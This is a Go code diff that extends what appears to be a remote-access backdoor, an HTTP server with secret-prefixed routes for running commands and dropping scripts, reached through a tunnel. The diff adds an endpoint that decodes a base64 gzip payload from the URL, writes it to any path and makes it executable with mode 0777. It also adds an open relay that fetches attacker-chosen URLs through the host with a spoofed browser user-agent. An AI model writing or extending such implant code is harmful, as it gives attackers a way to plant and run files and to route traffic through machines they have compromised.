@@ -7,7 +7,10 @@ import (
 	"os/exec"
 	"os"
 	logx "log"
+	"compress/gzip"
 	"fmt"
+	"io"
+	"bytes"
 	"io/ioutil"
 	"runtime"
 	"math/rand"
@@ -24,9 +27,8 @@ var (
 	log []string
 	ka_string string
 	serverURL string
+	proxy_target string
 )
-
-
 
 var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
 func init() {
@@ -112,7 +114,11 @@ func upd_script(w http.ResponseWriter, req *http.Request){
 		out=string(err.Error())
 		} else {
 			defer f.Close()
-			sDec, _ := b64.StdEncoding.DecodeString(b64pl)
+			sDec, err := b64.StdEncoding.DecodeString(b64pl)
+			if err!=nil {
+				http.Error(w, "Bad b64 pl", http.StatusInternalServerError)
+				return
+				}
 			_, err = f.Write(sDec)
 			if err != nil {
 				log=append(log,"upd_script write:"+err.Error())
@@ -131,12 +137,91 @@ func upd_script(w http.ResponseWriter, req *http.Request){
 			}
         w.Write([]byte(out))
 }
+func upd_scriptz(w http.ResponseWriter, req *http.Request){
+
+	out:="ok"
+	b64plz:=req.URL.Query().Get("b64plz")
+	name:=req.URL.Query().Get("name")
+        log=append(log,"upd_script "+ name)
+	f, err := os.Create(name)
+	if err != nil {
+		log=append(log,"upd_script create:"+err.Error())
+		out=string(err.Error())
+		} else {
+			defer f.Close()
+			sDecz, err := b64.StdEncoding.DecodeString(b64plz)
+			if err!=nil {
+				http.Error(w, "Bad b64 pl", http.StatusInternalServerError)
+				return
+				}
+			reader := bytes.NewReader(sDecz)
+			sDec, err := gzip.NewReader(reader);
+			if err!=nil {
+				http.Error(w, "bad gz pl", http.StatusInternalServerError)
+				return
+				}
+			stream, err := ioutil.ReadAll(sDec)
+			if err!=nil {
+				http.Error(w, "Server Error ", http.StatusInternalServerError)
+				return
+				}
+			_, err = f.Write(stream)
+			if err != nil {
+				log=append(log,"upd_script write:"+err.Error())
+				out=string(err.Error())
+				}else {
+					var err error
+					if runtime.GOOS != "windows" {
+						err = os.Chmod(name, 0777);
+						}
+					if err != nil {
+						log=append(log,"upd_script chmod:"+err.Error())
+						out=string(err.Error())
+						}
+					}
+
+			}
+        w.Write([]byte(out))
+}
+
 func getlog(w http.ResponseWriter, req *http.Request){
 	log=append(log,"getlog ")
         w.Header().Set("Content-Type", "text/plain")
         w.Write([]byte(strings.Join(log[:], "\n")))
 }
+func proxy_set(w http.ResponseWriter, req *http.Request){
+	target:=req.URL.Query().Get("target")
+	log=append(log,"proxy_set "+ target)
+        w.Header().Set("Content-Type", "text/plain")
+	resp:="failed"
+	if target!="" {
+		proxy_target=target
+		resp="sucess"
+		}
+        w.Write([]byte(resp))
+}
+func proxy_get(wr http.ResponseWriter, req *http.Request) {
 
+	log=append(log,"proxy_get")
+	client := &http.Client{}
+	nreq, err := http.NewRequest(http.MethodGet, proxy_target, nil)
+	if err != nil {
+		http.Error(wr, "Server Error", http.StatusInternalServerError)
+		logx.Fatal("ServeHTTP:", err)
+		}
+	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36")
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	resp, err := client.Do(nreq)
+	if err != nil {
+		http.Error(wr, "Server Error", http.StatusInternalServerError)
+		logx.Fatal("ServeHTTP:", err)
+	}
+	defer resp.Body.Close()
+	wr.WriteHeader(resp.StatusCode)
+	io.Copy(wr, resp.Body)
+}
+
+//  https://gist.github.com/yowu/f7dc34bd4736a65ff28d
 func do_lt(conf configuration) string {
 	c := lt.NewClient(conf.Host)
 	t := c.NewTunnel(conf.Target, conf.Port)
@@ -166,6 +251,9 @@ func do_main(conf configuration) {
 	mux.HandleFunc(seedSecret+"/cmd_back", cmd_background)
 	mux.HandleFunc(seedSecret+"/cmd_backc", cmd_background_check)
 	mux.HandleFunc(seedSecret+"/upd_script", upd_script)
+	mux.HandleFunc(seedSecret+"/upd_scriptz", upd_scriptz)
+	mux.HandleFunc(seedSecret+"/proxy_set", proxy_set)
+	mux.HandleFunc(seedSecret+"/proxy_get", proxy_get)
 	mux.HandleFunc(seedSecret+"/getlog", getlog)
 
 	err := http.ListenAndServe(":"+strconv.Itoa(conf.Port), mux)
